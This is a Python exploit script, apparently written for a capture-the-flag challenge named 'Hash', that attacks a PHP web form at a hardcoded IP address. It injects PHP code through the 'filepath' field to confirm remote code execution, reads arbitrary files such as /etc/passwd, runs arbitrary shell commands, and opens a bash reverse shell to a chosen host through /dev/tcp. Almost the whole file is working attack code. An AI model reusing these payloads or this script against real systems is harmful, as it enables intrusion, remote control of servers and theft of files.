#!/usr/bin/env python3
"""
Hash CTF Challenge Exploit (values-only extractor)
This version extracts only the meaningful values from the HTML response
(e.g. flag{...} or file lines) and prints them cleanly.
"""
import requests
import sys
import re
from urllib.parse import quote

TARGET = "http://84.247.129.120:44440/"


def exploit(payload):
    data = {"filepath": payload}
    try:
        r = requests.post(TARGET, data=data, timeout=10)
        return r.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def strip_tags(html: str) -> str:
    # remove style/script blocks first
    html = re.sub(r"(?is)<(script|style).*?>.*?</\1>", "", html)
    # extract container if present
    m = re.search(r'<div[^>]*class="container"[^>]*>(.*?)</div>', html, re.S | re.I)
    if m:
        html = m.group(1)
    # remove all HTML tags
    text = re.sub(r"<[^>]+>", "", html)
    # decode common HTML entities (basic)
    text = text.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
    # normalize whitespace
    lines = [line.strip() for line in text.splitlines()]
    lines = [l for l in lines if l]
    return "\n".join(lines)


def extract_values(html: str):
    clean = strip_tags(html)
    # 1) Look for explicit flag patterns
    flags = re.findall(r'flag\{.*?\}', clean, re.I)
    if flags:
        return flags
    # 2) Otherwise return reasonable lines (e.g. /etc/passwd lines or file output)
    lines = clean.splitlines()
    # Filter out UI text that commonly appears in the page
    exclude_patterns = [r"md5 file", r"enter the file path", r"hash file", r"failed to open stream", r"md5_file\("]
    filtered = []
    for L in lines:
        if any(re.search(pat, L, re.I) for pat in exclude_patterns):
            continue
        # keep lines that look like file contents: either contain ':' (passwd-like),
        # look like flag{...}, or are non-trivial short strings
        if ':' in L or re.search(r'flag\{', L, re.I) or len(L) > 3:
            filtered.append(L)
    # deduplicate while preserving order
    seen = set()
    out = []
    for l in filtered:
        if l not in seen:
            seen.add(l)
            out.append(l)
    return out or [clean]


def test_rce():
    print("[*] Testing for RCE...")
    payload = 'test"); echo "RCE_CONFIRMED"; //'
    result = exploit(payload)
    if result and "RCE_CONFIRMED" in result:
        print("[+] RCE confirmed!")
        return True
    print("[-] RCE test failed")
    return False


def get_reverse_shell(lhost, lport):
    payload = f'x"); shell_exec("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\' "); //'
    print(f"[*] Sending reverse shell to {lhost}:{lport}")
    print(f"[!] Make sure listener is running: nc -lvnp {lport}")
    exploit(payload)


def read_file_direct(filepath):
    payload = f'x"); echo shell_exec("find {filepath} -exec cat {{}} \\\\; 2>/dev/null"); //'
    print(f"[*] Attempting to read: {filepath}")
    result = exploit(payload)
    if not result:
        print("[-] No response")
        return
    vals = extract_values(result)
    for v in vals:
        print(v)


def php_single_quote_escape(s: str) -> str:
    """Escape a string so it can be safely placed inside a PHP single-quoted string.

    Replaces backslashes with double-backslashes and single quotes with \\' so the
    payload remains syntactically valid when injected into shell_exec('...').
    """
    return s.replace('\\', '\\\\').replace("'", "\\'")


def exec_command(cmd: str):
    """Execute an arbitrary command on the target via shell_exec and print output."""
    if not cmd:
        print("[-] No command specified")
        return
    print(f"[*] Executing remote command: {cmd}")
    # Escape for PHP single-quoted string
    esc = php_single_quote_escape(cmd)
    payload = f"x\"); echo shell_exec('{esc}'); //"
    result = exploit(payload)
    if not result:
        print("[-] No response")
        return
    vals = extract_values(result)
    for v in vals:
        print(v)


if __name__ == "__main__":
    print("=" * 60)
    print("Hash CTF Challenge Exploit (values-only)")
    print("=" * 60)

    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} test              # Test for RCE")
        print(f"  {sys.argv[0]} shell IP PORT    # Get reverse shell")
        print(f"  {sys.argv[0]} read /path/file  # Read file directly and print values")
        print(f"  {sys.argv[0]} exec <command>   # Execute arbitrary command and print output")
        sys.exit(1)

    command = sys.argv[1]

    if command == "test":
        test_rce()
    elif command == "shell" and len(sys.argv) == 4:
        get_reverse_shell(sys.argv[2], sys.argv[3])
    elif command == "read" and len(sys.argv) == 3:
        read_file_direct(sys.argv[2])
    elif command == "exec" and len(sys.argv) >= 3:
        exec_command(' '.join(sys.argv[2:]))
    else:
        print("[-] Invalid command")
